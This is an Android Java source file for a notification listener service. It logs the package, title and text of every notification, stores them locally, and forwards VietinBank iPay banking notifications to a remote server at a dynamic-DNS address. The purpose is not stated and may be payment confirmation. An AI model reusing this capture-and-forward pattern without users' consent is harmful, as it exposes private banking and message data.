package com.hust.bkservice;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

import static com.hust.bkservice.Key.TAG;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class NotificationService extends NotificationListenerService {
    public ArrayList<String> notificationList = new ArrayList<>();
    AppDatabase appDatabase;
    String packageName = "no-name";
    String title = "Untitled";
    String text = "empty";
    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference reference = database.getReference();
    private ApiService apiService;

    @Override
    public void onCreate() {
        super.onCreate();
        appDatabase = new AppDatabase(getApplicationContext());
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://hopsach.ddns.net/be/") // Địa chỉ server của bạn
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        apiService = retrofit.create(ApiService.class);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (Key.jobCompleted) {
            notificationList.clear();
            appDatabase.remove("notifications");
            Key.jobCompleted = false;
        }
        packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        if (extras != null) {
            title = extras.getString("android.title");
            text = extras.getString("android.text");
            String notification =packageName+ " : "+ title + " : " + text;
            if(packageName.contains("com.vietinbank.ipay")){
                sendLogToServer(new NotificationLog(packageName,title,text));
            }
            notificationList.add(notification);
            Log.d(TAG, notification);
        }
        appDatabase.putListString("notifications", notificationList);
    }
    private void sendLogToServer(NotificationLog log) {
        Call<Void> call = apiService.sendNotificationLog(log);

        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Log gửi thành công!");
                } else {
                    Log.e(TAG, "Lỗi khi gửi log: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Lỗi khi gửi log: " + t.getMessage());
            }
        });
    }
}